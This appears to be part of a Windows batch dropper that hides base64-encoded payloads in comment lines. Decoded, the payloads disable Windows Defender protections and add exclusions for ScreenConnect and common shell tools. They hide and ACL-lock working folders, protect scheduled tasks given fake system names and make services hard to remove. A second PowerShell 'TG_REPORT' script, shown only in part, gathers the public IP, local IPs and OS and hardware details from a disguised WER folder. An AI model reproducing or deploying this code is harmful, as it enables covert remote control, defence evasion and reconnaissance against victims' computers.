::XE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyIiAvdiBEaXNhYmxlQW50aVNweXdh
::cmUgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xN
::XFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXFJl
::YWwtVGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5n
::IC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxT
::T0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxSZWFs
::LVRpbWUgUHJvdGVjdGlvbiIgL3YgRGlzYWJsZUJlaGF2aW9yTW9uaXRvcmluZyAv
::dCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09G
::VFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1U
::aW1lIFByb3RlY3Rpb24iIC92IERpc2FibGVJT0FWUHJvdGVjdGlvbiAvdCBSRUdf
::RFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVc
::UG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1UaW1lIFBy
::b3RlY3Rpb24iIC92IERpc2FibGVTY3JpcHRTY2FubmluZyAvdCBSRUdfRFdPUkQg
::L2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9z
::b2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVXRCUi
::IC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxT
::T0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBh
::dGhzIiAvdiAiJVdEMiUiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0K
::cmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRl
::clxFeGNsdXNpb25zXFBhdGhzIiAvdiAiQzpcV2luZG93c1xUZW1wIiAvdCBSRUdf
::RFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVc
::TWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3Yg
::IiVURU1QJSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRk
::ICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1
::c2lvbnNcUGF0aHMiIC92ICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VF
::UDElKSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJI
::S0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lv
::bnNcUGF0aHMiIC92ICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDIl
::KSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xN
::XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNc
::UGF0aHMiIC92ICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSIg
::L3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNP
::RlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0
::aHMiIC92ICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIgL3QgUkVHX0RXT1JE
::IC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jv
::c29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlUEY4
::NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpIiAvdCBSRUdfRFdPUkQg
::L2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9z
::b2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVQRjg2
::JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSkiIC90IFJFR19EV09SRCAv
::ZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3Nv
::ZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGODYl
::XFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSIgL3QgUkVHX0RXT1JEIC9k
::IDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29m
::dFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlUEY4NiVc
::U2NyZWVuQ29ubmVjdCBDbGllbnQqIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVs
::IDI+JjENCmZvciAlJVAgaW4gKG1zaWV4ZWMuZXhlIGN1cmwuZXhlIGNtZC5leGUg
::cG93ZXJzaGVsbC5leGUgY2VydHV0aWwuZXhlIFNjcmVlbkNvbm5lY3QuQ2xpZW50
::U2VydmljZS5leGUgU2NyZWVuQ29ubmVjdC5XaW5kb3dzQ2xpZW50LmV4ZSkgZG8g
::KA0KICByZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERl
::ZmVuZGVyXEV4Y2x1c2lvbnNcUHJvY2Vzc2VzIiAvdiAiJSVQIiAvdCBSRUdfRFdP
::UkQgL2QgMCAvZiA+bnVsIDI+JjENCikNCg0KUkVNIC0tLSBEZWZlbmRlcjogbGl2
::ZSBNcFByZWZlcmVuY2UgKHN0cm9uZ2VyIHRoYW4gcmVnIGFsb25lKSAtLS0NCnBv
::d2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRp
::b25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZl
::cmVuY2U9J1NpbGVudGx5Q29udGludWUnOyIgXg0KICAiVHJ5e1NldC1NcFByZWZl
::cmVuY2UgLURpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgJHRydWU7IFNldC1NcFBy
::ZWZlcmVuY2UgLURpc2FibGVCZWhhdmlvck1vbml0b3JpbmcgJHRydWU7IFNldC1N
::cFByZWZlcmVuY2UgLURpc2FibGVJT0FWUHJvdGVjdGlvbiAkdHJ1ZTsgU2V0LU1w
::UHJlZmVyZW5jZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0cnVlfUNhdGNoe307
::IiBeDQogICIkcGF0aHM9QCgnJVdEJScsJyVXRDIlJywnQzpcV2luZG93c1xUZW1w
::JywkZW52OlRFTVAsJyVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQqJywnJVBGODYl
::XFNjcmVlbkNvbm5lY3QgQ2xpZW50KicpOyIgXg0KICAidHJ5eyRwYXRocys9QChH
::ZXQtQ2hpbGRJdGVtIC1QYXRoICRlbnY6UHJvZ3JhbUZpbGVzIC1GaWx0ZXIgJ1Nj
::cmVlbkNvbm5lY3QgQ2xpZW50KicgLURpcmVjdG9yeSAtRUEgMCB8IEZvckVhY2gt
::T2JqZWN0IHskXy5GdWxsTmFtZX0pfWNhdGNoe307IiBeDQogICJ0cnl7JHBmODY9
::W0Vudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgnUHJvZ3JhbUZpbGVzWDg2Jyk7
::IGlmKCRwZjg2KXskcGF0aHMrPUAoR2V0LUNoaWxkSXRlbSAtUGF0aCAkcGY4NiAt
::RmlsdGVyICdTY3JlZW5Db25uZWN0IENsaWVudConIC1EaXJlY3RvcnkgLUVBIDAg
::fCBGb3JFYWNoLU9iamVjdCB7JF8uRnVsbE5hbWV9KX19Y2F0Y2h7fTsiIF4NCiAg
::ImZvcmVhY2goJHAgaW4gKCRwYXRocyB8IFNlbGVjdC1PYmplY3QgLVVuaXF1ZSkp
::eyBpZigkcCl7IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJHAgLUVB
::IDAgfSB9OyIgXg0KICAiZm9yZWFjaCgkeCBpbiBAKCdtc2lleGVjLmV4ZScsJ2N1
::cmwuZXhlJywnY21kLmV4ZScsJ3Bvd2Vyc2hlbGwuZXhlJywnY2VydHV0aWwuZXhl
::JywnU2NyZWVuQ29ubmVjdC5DbGllbnRTZXJ2aWNlLmV4ZScsJ1NjcmVlbkNvbm5l
::Y3QuV2luZG93c0NsaWVudC5leGUnKSl7IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1
::c2lvblByb2Nlc3MgJHggLUVBIDAgfTsiIF4NCiAgIkFkZC1NcFByZWZlcmVuY2Ug
::LUV4Y2x1c2lvbkV4dGVuc2lvbiAnLmNtZCcsJy5wczEnLCcubXNpJyAtRUEgMCIg
::Pm51bCAyPiYxDQoNClJFTSAtLS0gQUNMOiBvbmx5IFNZU1RFTSArIEFkbWluaXN0
::cmF0b3JzIG9uIHBlcnNpc3QgZGlycyAtLS0NCmNhbGwgOkxvY2tEaXIgIiVXRCUi
::DQpjYWxsIDpMb2NrRGlyICIlV0QyJSINCg0KUkVNIC0tLSBoaWRlIHdvcmtkaXJz
::ICsga2V5IHBheWxvYWQgZmlsZXMgLS0tDQphdHRyaWIgK2ggK3MgIiVXRCUiID5u
::dWwgMj4mMQ0KYXR0cmliICtoICtzICIlV0QyJSIgPm51bCAyPiYxDQpSRU0gUzU6
::IGRvIE5PVCBoaWRlL2xvY2sgdGhlIG11dGFibGUgcGF5bG9hZCBzY3JpcHRzIC0g
::Y29weS9tb3ZlIG92ZXIgK2ggK3MgZmlsZXMNClJFTSBmYWlscyBzaWxlbnRseSBh
::bmQgZnJvemUgdGhlIHdob2xlIGZsZWV0J3Mgc2VsZi11cGRhdGUuIEhpZGRlbiBk
::aXJzIGNvbmNlYWwgY29udGVudHMgYWxyZWFkeS4NCmZvciAlJUYgaW4gKHBrZy5t
::c2kgbm90aWZ5LmNmZyBpZGVudGl0eS5jZmcgc3RhdGUuanNvbikgZG8gKA0KICBp
::ZiBleGlzdCAiJVdEJVwlJUYiIGF0dHJpYiAraCArcyAiJVdEJVwlJUYiID5udWwg
::Mj4mMQ0KKQ0KDQpSRU0gLS0tIEFDTDogc2NoZWR1bGVkIHRhc2sgWE1MIChoYXJk
::ZXIgdG8gZGVsZXRlIHdpdGhvdXQgQWRtaW4pIC0tLQ0KUkVNIFM2OiBuYW1lcyBj
::b250YWluIHNwYWNlcyAoIlNlcnZlciBEaWFnbm9zdGljcyIpIC0gdGhlIGNtZCBG
::T1IgbG9vcCBzcGxpdA0KUkVNIHRoZW0gaW50byBnYXJiYWdlIHRva2Vucy4gUG93
::ZXJTaGVsbCByZWFkcyBpZGVudGl0eS5jZmcgZGlyZWN0bHkgaW5zdGVhZC4NCnBv
::d2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRp
::b25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZl
::cmVuY2U9J1NpbGVudGx5Q29udGludWUnOyAkbmFtZXM9QCgpOyIgXg0KICAiaWYo
::VGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAnJVdEJVxpZGVudGl0eS5jZmcnKXsgR2V0
::LUNvbnRlbnQgLUxpdGVyYWxQYXRoICclV0QlXGlkZW50aXR5LmNmZycgLUZvcmNl
::IHwgRm9yRWFjaC1PYmplY3QgeyBpZigkXyAtbWF0Y2ggJ15UQVNLX1tBLURdPSgu
::KykkJyl7ICRuYW1lcyArPSAkbWF0Y2hlc1sxXS5UcmltKCkuVHJpbVN0YXJ0KCdc
::JykgfSB9IH0iIF4NCiAgImVsc2UgeyAkbmFtZXM9QCgnV2VyUXVldWVTeW5jJywn
::UGxhU2VydmVySGVhbHRoJywnV2RpSG9zdFByb3h5JywnVGNwSXBDb25mbGljdFJl
::cycpIH07IiBeDQogICJmb3JlYWNoKCRuIGluICRuYW1lcyl7ICRmID0gSm9pbi1Q
::YXRoICclVEFTS1JPT1QlJyAkbjsgaWYoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAk
::Zil7ICYgaWNhY2xzLmV4ZSAkZiAvaW5oZXJpdGFuY2U6ciB8IE91dC1OdWxsOyAm
::IGljYWNscy5leGUgJGYgL2dyYW50OnIgJ05UIEFVVEhPUklUWVxTWVNURU06Ricg
::J0JVSUxUSU5cQWRtaW5pc3RyYXRvcnM6RicgfCBPdXQtTnVsbDsgJiBhdHRyaWIu
::ZXhlICtoICtzICRmIHwgT3V0LU51bGwgfSB9IiA+bnVsIDI+JjENCg0KUkVNIC0t
::LSBBQ0w6IFdNSSB3YXRjaGRvZyBzdWJzY3JpcHRpb24gZmlsZXMgKGNoYWluIDIp
::IC0tLQ0KaWNhY2xzICIlU3lzdGVtUm9vdCVcU3lzdGVtMzJcd2JlbVxSZXBvc2l0
::b3J5IiAvZ3JhbnQgIk5UIEFVVEhPUklUWVxTWVNURU06RiIgPm51bCAyPiYxDQoN
::ClJFTSAtLS0gQUNMOiBkbyBOT1QgTG9ja0RpciBTY3JlZW5Db25uZWN0IGluc3Rh
::bGwgZGlycyAtLS0NClJFTSB0YWtlb3duK3N0cmlwIG9uIGxpdmUgU0MgZGlycyBi
::cmVha3MgY2xpZW50IGZpbGUgd3JpdGVzL3VwZGF0ZXMg4oaSIHBhbmVsIE9GRkxJ
::TkUNClJFTSB3aGlsZSBzZXJ2aWNlIHN0aWxsIGxvb2tzIFJ1bm5pbmcuIERlZmVu
::ZGVyIGV4Y2x1c2lvbnMgKyBzZXJ2aWNlIFNEIGFyZSBlbm91Z2guDQpSRU0gTzM3
::OiBvbmUtc2hvdCB1bmxvY2sgaWYgYSBwcmlvciBidWlsZCBMb2NrRGlyJ2QgdGhl
::c2UgcGF0aHMuDQppZiBleGlzdCAiJVdEJVxzZWN1cmVfc2MuZmxhZyIgKA0KICBm
::aW5kc3RyIC9DOiJzY19ub2xvY2tfZGlycyIgIiVXRCVcc2VjdXJlX3NjLmZsYWci
::ID5udWwgMj4mMQ0KICBpZiBlcnJvcmxldmVsIDEgKA0KICAgIGVjaG8gc2NfdW5s
::b2NrX3ByaW9yX2xvY2tkaXI+PiIlTE9HJSINCiAgICBmb3IgJSVEIGluICgNCiAg
::ICAgICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDElKSINCiAgICAg
::ICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDIlKSINCiAgICAgICIl
::UEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSINCiAgICAgICIlUEY4
::NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpIg0KICAgICAgIiVQRjg2
::JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSkiDQogICAgICAiJVBGODYl
::XFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSINCiAgICApIGRvICgNCiAg
::ICAgIGlmIGV4aXN0ICIlJX5EIiAoDQogICAgICAgIHRha2Vvd24gL0YgIiUlfkQi
::IC9SIC9EIFkgPm51bCAyPiYxDQogICAgICAgIGljYWNscyAiJSV+RCIgL3Jlc2V0
::IC9UIC9DIC9RID5udWwgMj4mMQ0KICAgICAgICBpY2FjbHMgIiUlfkQiIC9ncmFu
::dCAiTlQgQVVUSE9SSVRZXFNZU1RFTTooT0kpKENJKUYiICJCVUlMVElOXEFkbWlu
::aXN0cmF0b3JzOihPSSkoQ0kpRiIgPm51bCAyPiYxDQogICAgICApDQogICAgKQ0K
::ICAgIGVjaG8gc2Nfbm9sb2NrX2RpcnM+JVdEJVxzZWN1cmVfc2MuZmxhZw0KICAp
::DQopIGVsc2UgKA0KICBlY2hvIHNjX25vbG9ja19kaXJzPiVXRCVcc2VjdXJlX3Nj
::LmZsYWcNCikNCg0KUkVNIC0tLSBTQyBzZXJ2aWNlczogU1lTVEVNIGNhbiBjb25m
::aWcvc3RvcC9kZWxldGUvc2RzZXQ7IEJBIGZ1bGw7IHVzZXJzIGJsb2NrZWQgLS0t
::DQpSRU0gUzEyOiBTWSBtdXN0IGluY2x1ZGUgU0QgKERFTEVURSkgKyBXRCAoV1JJ
::VEVfREFDKSArIFdQIHNvIG9ycGhhbiBoZWFsIC8gRlAgbWlncmF0aW9uIC8NClJF
::TSBzYyBzZHNldCByZS1hcHBseSB3b3JrIHVuZGVyIFNZU1RFTSAodGFza3MgcnVu
::IGFzIFNZU1RFTSkuIFdpdGhvdXQgU0QsIHNjIGRlbGV0ZSBBY2Nlc3MgRGVuaWVk
::Lg0Kc2V0ICJTRD1EOihBOztDQ0RDTENTV1JQV1BEVExPQ1JSQ1NEV1A7OztTWSko
::QTs7Q0NEQ0xDU1dSUFdQRFRMT0NSU0RSQ1dEV087OztCQSkiDQpzYy5leGUgc2Rz
::ZXQgIiVQUklNJSIgIiVTRCUiID5udWwgMj4mMQ0Kc2MuZXhlIHNkc2V0ICIlQUxU
::JSIgIiVTRCUiID5udWwgMj4mMQ0Kc2MuZXhlIHNkc2V0ICIlR1JZWEElIiAiJVNE
::JSIgPm51bCAyPiYxDQpzYy5leGUgY29uZmlnICIlUFJJTSUiIHN0YXJ0PSBhdXRv
::ID5udWwgMj4mMQ0Kc2MuZXhlIGNvbmZpZyAiJUFMVCUiIHN0YXJ0PSBhdXRvID5u
::dWwgMj4mMQ0Kc2MuZXhlIGNvbmZpZyAiJUdSWVhBJSIgc3RhcnQ9IGF1dG8gPm51
::bCAyPiYxDQpzYy5leGUgZmFpbHVyZSAiJVBSSU0lIiByZXNldD0gODY0MDAgYWN0
::aW9ucz0gcmVzdGFydC82MDAwMC9yZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAg
::Pm51bCAyPiYxDQpzYy5leGUgZmFpbHVyZSAiJUFMVCUiIHJlc2V0PSA4NjQwMCBh
::Y3Rpb25zPSByZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAvcmVzdGFydC82MDAw
::MCA+bnVsIDI+JjENCnNjLmV4ZSBmYWlsdXJlICIlR1JZWEElIiByZXNldD0gODY0
::MDAgYWN0aW9ucz0gcmVzdGFydC82MDAwMC9yZXN0YXJ0LzYwMDAwL3Jlc3RhcnQv
::NjAwMDAgPm51bCAyPiYxDQoNCmVjaG8gc2VjdXJlX2RvbmU+PiIlTE9HJSINCmV4
::aXQgL2IgMA0KDQo6TG9ja0Rpcg0Kc2V0ICJUPSV+MSINCmlmIG5vdCBleGlzdCAi
::JVQlIiBleGl0IC9iIDANClJFTSB0YWtlIG93bmVyc2hpcCB0aGVuIHN0cmlwIGlu
::aGVyaXRlZCBBQ0VzOyBTWVNURU0rQWRtaW5zIG9ubHkNCnRha2Vvd24gL0YgIiVU
::JSIgL1IgL0QgWSA+bnVsIDI+JjENCmljYWNscyAiJVQlIiAvaW5oZXJpdGFuY2U6
::ciA+bnVsIDI+JjENCmljYWNscyAiJVQlIiAvZ3JhbnQ6ciAiTlQgQVVUSE9SSVRZ
::XFNZU1RFTTooT0kpKENJKUYiICJCVUlMVElOXEFkbWluaXN0cmF0b3JzOihPSSko
::Q0kpRiIgPm51bCAyPiYxDQppY2FjbHMgIiVUJSIgL3JlbW92ZTpnICJVc2VycyIg
::IkF1dGhlbnRpY2F0ZWQgVXNlcnMiICJFdmVyeW9uZSIgIk5UIEFVVEhPUklUWVxJ
::TlRFUkFDVElWRSIgIkJVSUxUSU5cVXNlcnMiID5udWwgMj4mMQ0KZXhpdCAvYiAw
::DQo=
::B64_SEC_END
::B64_TGR_BEGIN
::I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQ0KIyBUR19SRVBPUlQgQlVJTEQgMjAyNjA4
::MDJUMTYgLSByb290LWxldmVsIHRhc2sgbmFtZXMgKElERU5UVkVSPTcpOyBUUiBv
::d25lcnNoaXA7IFJNTStEYXR0byBrZWVwOyBkeW5hbWljIGdyeXhhIEZQDQpwYXJh
::bSgNCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV1bc3RyaW5nXSRT
::dGF0ZSwNCiAgICBbc3RyaW5nXSRTdW1tYXJ5ID0gJycsDQogICAgW3N0cmluZ10k
::V29ya0RpciA9ICdDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xXRVJc
::VGVtcFwud3VjYWNoZScsDQogICAgW3N0cmluZ10kT2xkU3RhdGUgPSAnJywNCiAg
::ICBbVmFsaWRhdGVTZXQoJ3JpY2gnLCAnY29tcGFjdCcpXVtzdHJpbmddJE1vZGUg
::PSAncmljaCcsDQogICAgW3N0cmluZ10kQnVpbGQgPSAnTzE1JywNCiAgICBbc3Ry
::aW5nXSRDb3VudCA9ICcwJw0KKQ0KDQokRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0g
::J1NpbGVudGx5Q29udGludWUnDQokUHJvZ3Jlc3NQcmVmZXJlbmNlID0gJ1NpbGVu
::dGx5Q29udGludWUnDQp0cnkgeyBbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpT
::ZWN1cml0eVByb3RvY29sID0gW05ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRs
::czEyIH0gY2F0Y2gge30NCg0KZnVuY3Rpb24gR2V0LUNmZyB7DQogICAgJHBhdGgg
::PSBKb2luLVBhdGggJFdvcmtEaXIgJ25vdGlmeS5jZmcnDQogICAgJGNmZyA9IEB7
::fQ0KICAgIGlmICgtbm90IChUZXN0LVBhdGggJHBhdGgpKSB7IHJldHVybiAkY2Zn
::IH0NCiAgICBHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHBhdGggfCBGb3JFYWNo
::LU9iamVjdCB7DQogICAgICAgIGlmICgkXyAtbWF0Y2ggJ15ccyooW0EtWmEtejAt
::OV9dKylccyo9XHMqKC4qKVxzKiQnKSB7DQogICAgICAgICAgICAkY2ZnWyRtYXRj
::aGVzWzFdXSA9ICRtYXRjaGVzWzJdLlRyaW0oKQ0KICAgICAgICB9DQogICAgfQ0K
::ICAgIHJldHVybiAkY2ZnDQp9DQoNCmZ1bmN0aW9uIEVzYyhbc3RyaW5nXSRzKSB7
::DQogICAgaWYgKCRudWxsIC1lcSAkcykgeyByZXR1cm4gJycgfQ0KICAgIHJldHVy
::biAoJHMgLXJlcGxhY2UgJyYnLCAnJmFtcDsnIC1yZXBsYWNlICc8JywgJyZsdDsn
::IC1yZXBsYWNlICc+JywgJyZndDsnKQ0KfQ0KDQpmdW5jdGlvbiBHZXQtUHVibGlj
::SXAgew0KICAgIGZvcmVhY2ggKCR1IGluIEAoDQogICAgICAgICAgICAnaHR0cHM6
::Ly9hcGkuaXBpZnkub3JnJywNCiAgICAgICAgICAgICdodHRwczovL2lmY29uZmln
::Lm1lL2lwJywNCiAgICAgICAgICAgICdodHRwczovL2ljYW5oYXppcC5jb20nDQog
::ICAgICAgICkpIHsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICRyID0gSW52
::b2tlLVdlYlJlcXVlc3QgLVVyaSAkdSAtVXNlQmFzaWNQYXJzaW5nIC1UaW1lb3V0
::U2VjIDYNCiAgICAgICAgICAgICRpcCA9ICgkci5Db250ZW50IHwgT3V0LVN0cmlu
::ZykuVHJpbSgpDQogICAgICAgICAgICBpZiAoJGlwIC1tYXRjaCAnXlxkezEsM30o
::XC5cZHsxLDN9KXszfSQnIC1vciAkaXAgLW1hdGNoICc6JykgeyByZXR1cm4gJGlw
::IH0NCiAgICAgICAgfSBjYXRjaCB7fQ0KICAgIH0NCiAgICByZXR1cm4gJ24vYScN
::Cn0NCg0KZnVuY3Rpb24gR2V0LUxvY2FsSXBzIHsNCiAgICB0cnkgew0KICAgICAg
::ICAkaXBzID0gR2V0LU5ldElQQWRkcmVzcyAtQWRkcmVzc0ZhbWlseSBJUHY0IC1F
::cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwNCiAgICAgICAgICAgIFdoZXJl
::LU9iamVjdCB7ICRfLklQQWRkcmVzcyAtbm90bGlrZSAnMTI3LionIC1hbmQgJF8u
::UHJlZml4T3JpZ2luIC1uZSAnV2VsbEtub3duJyB9IHwNCiAgICAgICAgICAgIFNl
::bGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IElQQWRkcmVzcyAtVW5pcXVlDQog
::ICAgICAgIGlmICgkaXBzKSB7IHJldHVybiAoJGlwcyAtam9pbiAnLCAnKSB9DQog
::ICAgfSBjYXRjaCB7fQ0KICAgIHRyeSB7DQogICAgICAgICRpcHMgPSBHZXQtQ2lt
::SW5zdGFuY2UgV2luMzJfTmV0d29ya0FkYXB0ZXJDb25maWd1cmF0aW9uIC1GaWx0
::ZXIgJ0lQRW5hYmxlZD1UcnVlJyB8DQogICAgICAgICAgICBGb3JFYWNoLU9iamVj
::dCB7ICRfLklQQWRkcmVzcyB9IHwgV2hlcmUtT2JqZWN0IHsgJF8gLWFuZCAkXyAt
::bm90bGlrZSAnMTI3LionIC1hbmQgJF8gLW5vdGxpa2UgJyo6KicgfQ0KICAgICAg
::ICBpZiAoJGlwcykgeyByZXR1cm4gKCgkaXBzIHwgU2VsZWN0LU9iamVjdCAtVW5p
::cXVlKSAtam9pbiAnLCAnKSB9DQogICAgfSBjYXRjaCB7fQ0KICAgIHJldHVybiAn
::bi9hJw0KfQ0KDQpmdW5jdGlvbiBHZXQtT3NJbmZvIHsNCiAgICAkbyA9IFtvcmRl
::cmVkXUB7DQogICAgICAgIENhcHRpb24gPSAnbi9hJzsgVmVyc2lvbiA9ICduL2En
::OyBCdWlsZCA9ICduL2EnOyBBcmNoID0gJ24vYScNCiAgICAgICAgRG9tYWluID0g
::J24vYSc7IEluc3RhbGxEYXRlID0gJ24vYSc7IExhc3RCb290ID0gJ24vYScNCiAg
::ICAgICAgQ1BVID0gJ24vYSc7IE1hbnVmYWN0dXJlciA9ICduL2EnOyBNb2RlbCA9
::ICduL2EnOyBTZXJpYWwgPSAnbi9hJw0KICAgICAgICBUb3RhbFJBTV9HQiA9ICdu
::L2EnOyBEaXNrRnJlZV9HQiA9ICduL2EnOyBEaXNrU2l6ZV9HQiA9ICduL2EnDQog
::ICAgfQ0KICAgIHRyeSB7DQogICAgICAgICRvcyA9IEdldC1DaW1JbnN0YW5jZSBX
::aW4zMl9PcGVyYXRpbmdTeXN0ZW0NCiAgICAgICAgJG8uQ2FwdGlvbiA9ICRvcy5D
::YXB0aW9uDQogICAgICAgICRvLlZlcnNpb24gPSAkb3MuVmVyc2lvbg0KICAgICAg
::ICAkby5CdWlsZCA9ICRvcy5CdWlsZE51bWJlcg0KICAgICAgICAkby5BcmNoID0g
::JG9zLk9TQXJjaGl0ZWN0dXJlDQogICAgICAgICRvLkluc3RhbGxEYXRlID0gKCRv
::cy5JbnN0YWxsRGF0ZSB8IEdldC1EYXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQnKQ0K
::ICAgICAgICAkby5MYXN0Qm9vdCA9ICgkb3MuTGFzdEJvb3RVcFRpbWUgfCBHZXQt
::RGF0ZSAtRm9ybWF0ICd5eXl5LU1NLWRkIEhIOm1tJykNCiAgICAgICAgJG8uVG90
::YWxSQU1fR0IgPSBbbWF0aF06OlJvdW5kKCRvcy5Ub3RhbFZpc2libGVNZW1vcnlT
::aXplIC8gMU1CLCAxKQ0KICAgIH0gY2F0Y2gge30NCiAgICB0cnkgew0KICAgICAg
::ICAkY3MgPSBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfQ29tcHV0ZXJTeXN0ZW0NCiAg
::ICAgICAgJG8uRG9tYWluID0gaWYgKCRjcy5QYXJ0T2ZEb21haW4pIHsgJGNzLkRv
::bWFpbiB9IGVsc2UgeyAkY3MuV29ya2dyb3VwIH0NCiAgICAgICAgJG8uTWFudWZh
::Y3R1cmVyID0gJGNzLk1hbnVmYWN0dXJlcg0KICAgICAgICAkby5Nb2RlbCA9ICRj
::cy5Nb2RlbA0KICAgIH0gY2F0Y2gge30NCiAgICB0cnkgew0KICAgICAgICAkby5D
::UFUgPSAoR2V0LUNpbUluc3RhbmNlIFdpbjMyX1Byb2Nlc3NvciB8IFNlbGVjdC1P
::YmplY3QgLUZpcnN0IDEgLUV4cGFuZFByb3BlcnR5IE5hbWUpDQogICAgfSBjYXRj
::aCB7fQ0KICAgIHRyeSB7DQogICAgICAgICRvLlNlcmlhbCA9IChHZXQtQ2ltSW5z
